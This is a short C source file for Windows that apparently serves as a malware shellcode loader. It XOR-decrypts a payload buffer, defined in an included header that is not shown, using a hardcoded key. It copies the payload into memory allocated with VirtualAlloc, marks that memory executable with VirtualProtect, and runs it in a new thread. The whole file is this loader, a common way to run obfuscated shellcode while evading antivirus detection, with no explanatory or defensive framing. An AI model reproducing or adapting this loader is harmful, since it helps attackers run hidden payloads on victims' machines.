#include "lib/crypto.h"
#include<windows.h>
#include "lib/matx.h"

unsigned int payload_size = sizeof(buf);



int main(){
    void *mem_buffer;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect;
    char key[] = "eerthing went wrong";
    mem_buffer = VirtualAlloc(0 , payload_size , MEM_COMMIT | MEM_RESERVE  , PAGE_READWRITE);
    XOR(buf, key);
    RtlMoveMemory(mem_buffer, buf, payload_size);
    rv = VirtualProtect(mem_buffer , payload_size , PAGE_EXECUTE_READ,&oldprotect);
    if(rv != 0 ){
        th = CreateThread(0,0,(LPTHREAD_START_ROUTINE )mem_buffer,0,0,0);
        WaitForSingleObject(th , -1);
    }
    else{
        printf("somthing went wrong");
    }
    return 0;
}